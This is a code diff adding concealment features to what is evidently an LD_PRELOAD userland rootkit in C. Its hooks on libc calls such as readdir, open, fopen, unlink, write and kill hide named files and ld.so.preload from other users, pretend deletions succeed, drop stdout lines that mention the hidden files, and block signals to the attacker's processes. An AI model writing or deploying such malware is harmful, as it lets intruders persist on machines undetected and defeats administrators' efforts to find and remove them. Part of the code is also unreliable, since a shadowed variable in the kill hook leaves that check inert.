@@ -33,6 +33,10 @@ int execve(const char *path, char *const argv[], char *const envp[]) {
         return o_execve(path, argv, envp);
     }
 
+    if (strcmp(path, HIDDEN_EXEC_PATH) == 0) {
+        return -1;
+    }
+
     return o_execve(path, argv, envp);
 }
 
@@ -51,10 +55,16 @@ struct dirent *readdir(DIR *p) {
     }
 
     struct dirent *dir = o_readdir(p);
+
     if (dir == NULL) {
         return NULL;
     }
 
+    if (strcmp(dir->d_name, HIDDEN_FILENAME) == 0 || strcmp(dir->d_name, HIDDEN_FILENAME2) == 0) {
+        // hide file
+        return readdir(p);
+    }
+    
     return dir;
 }
 
@@ -77,6 +87,10 @@ struct dirent64 *readdir64(DIR *p) {
         return NULL;
     }
 
+    if (strcmp(dir->d_name, HIDDEN_FILENAME) == 0 || strcmp(dir->d_name, HIDDEN_FILENAME2) == 0) {
+        return readdir64(p);
+    }
+
     return dir;
 }
 
@@ -92,6 +106,14 @@ int unlink(const char *pathname) {
 
     if (good_gid() == 1) {
         return o_unlink(pathname);
+    }
+
+    if (
+        strcmp(pathname, "ld.so.preload") == 0 
+        || strcmp(pathname, HIDDEN_FILENAME) == 0
+        || strcmp(pathname, HIDDEN_FILENAME2) == 0
+    ) {
+        return 0;
     }
 
     return o_unlink(pathname);
@@ -111,6 +133,14 @@ int unlinkat(int dirfd, const char * pathname, int flags) {
         return o_unlinkat(dirfd, pathname, flags);
     }
 
+    if (
+        strcmp(pathname, "ld.so.preload") == 0 
+        || strcmp(pathname, HIDDEN_FILENAME2) == 0
+        || strcmp(pathname, HIDDEN_FILENAME) == 0
+    ) {
+        return 0;
+    }
+
     return o_unlinkat(dirfd, pathname, flags);
 }
 
@@ -125,6 +155,13 @@ ssize_t write(int fd, const void *xbuf, size_t count) {
 
     if (good_gid() == 1) {
         return o_write(fd, xbuf, count);
+    }
+
+    if (fd == 1) {
+        char *buf = (char *) xbuf;
+        if (strstr(buf, HIDDEN_FILENAME) != NULL || strstr(buf, HIDDEN_FILENAME2) != NULL) {
+            return count;
+        }
     }
 
     return o_write(fd, xbuf, count);
@@ -161,6 +198,32 @@ int kill(pid_t pid, int sig) {
         return o_kill(pid, sig);
     }
 
+    // check the proccess gid
+    char path[1024];
+    sprintf(path, "/proc/%d/status", pid);
+    FILE *fp = fopen(path, "r");
+    if (fp == NULL) {
+        return o_kill(pid, sig);
+    }
+
+    int gid = -1;
+    char line[256];
+    while (fgets(line, sizeof(line), fp)) {
+        if (strncmp(line, "Gid:", 4) == 0) {
+            int gid;
+            if (sscanf(line, "Gid: %d", &gid) == 1) {
+                break;
+            }
+            break;
+        }
+    }
+
+    fclose(fp);
+
+    if (gid == GID) {
+        return -1;
+    }
+
     return o_kill(pid, sig);
 }
 
@@ -176,6 +239,11 @@ int openat(int dirfd, const char *path, int flags, ...) {
 
     if (good_gid() == 1) {
         return o_openat(dirfd, path, flags);
+    }
+
+    // check if the file is hidden if so return -1
+    if (strcmp(path, "ld.so.preload") == 0 || strcmp(path, HIDDEN_FILENAME) == 0 || strcmp(path, HIDDEN_FILENAME2) == 0) {
+        return -1;
     }
 
     return o_openat(dirfd, path, flags);
@@ -195,6 +263,10 @@ int open64(const char *path, int flags, ...) {
         return o_openat64(AT_FDCWD, path, flags);
     }
 
+    if (strcmp(path, "ld.so.preload") == 0 || strcmp(path, HIDDEN_FILENAME) == 0 || strcmp(path, HIDDEN_FILENAME2) == 0) {
+        return -1;
+    }
+
     return o_openat64(AT_FDCWD, path, flags);
 }
 
@@ -210,6 +282,10 @@ int open(const char *path, int flags, ...) {
 
     if (good_gid() == 1) {
         return o_open(path, flags);
+    }
+
+    if (strcmp(path, "ld.so.preload") == 0 || strcmp(path, HIDDEN_FILENAME) == 0 || strcmp(path, HIDDEN_FILENAME2) == 0) {
+        return -1;
     }
 
     return o_open(path, flags);
@@ -229,24 +305,11 @@ FILE *fopen(const char *path, const char *mode) {
         return o_fopen(path, mode);
     }
 
-    return o_fopen(path, mode);
-}
-
-// pathmatch
-
-int (*o_fnmatch)(const char *, const char *, int);
-int fnmatch(const char *pattern, const char *string, int flags) {
-#ifdef VERBOSE
-    printf("fnmatch called\n");
-#endif
-    if(!o_fnmatch)
-        o_fnmatch = dlsym(RTLD_NEXT, "fnmatch");
-
-    if (good_gid() == 1) {
-        return o_fnmatch(pattern, string, flags);
+    if (strcmp(path, "ld.so.preload") == 0 || strcmp(path, HIDDEN_FILENAME) == 0 || strcmp(path, HIDDEN_FILENAME2) == 0) {
+        return NULL;
     }
 
-    return o_fnmatch(pattern, string, flags);
+    return o_fopen(path, mode);
 }
 
 //shutdown
